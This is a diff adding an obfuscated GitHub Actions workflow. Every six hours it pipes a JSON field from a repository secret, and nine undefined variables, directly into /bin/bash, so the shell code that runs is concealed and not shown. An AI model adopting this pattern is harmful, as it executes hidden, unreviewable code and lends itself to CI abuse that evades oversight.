@@ -1,0 +1,27 @@
+name: tousanhougua
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: tousanhougua
+        env:
+          zvop6: ${{ secrets.zvop6 }}
+        run: |
+          echo $zvop6 | jq -r .yi85 | /bin/bash
+          echo $qtq252 | jq -r .bo3 | /bin/bash
+          echo $bpq935 | jq -r .i8361 | /bin/bash
+          echo $b54771 | jq -r .je657 | /bin/bash
+          echo $e03 | jq -r .yu9 | /bin/bash
+          echo $q17 | jq -r .yjcnb1605 | /bin/bash
+          echo $q115 | jq -r .zut76544 | /bin/bash
+          echo $sy1 | jq -r .i2946 | /bin/bash
+          echo $phbgk6 | jq -r .vzk1 | /bin/bash
+          echo $gdj38558 | jq -r .yh7 | /bin/bash
+
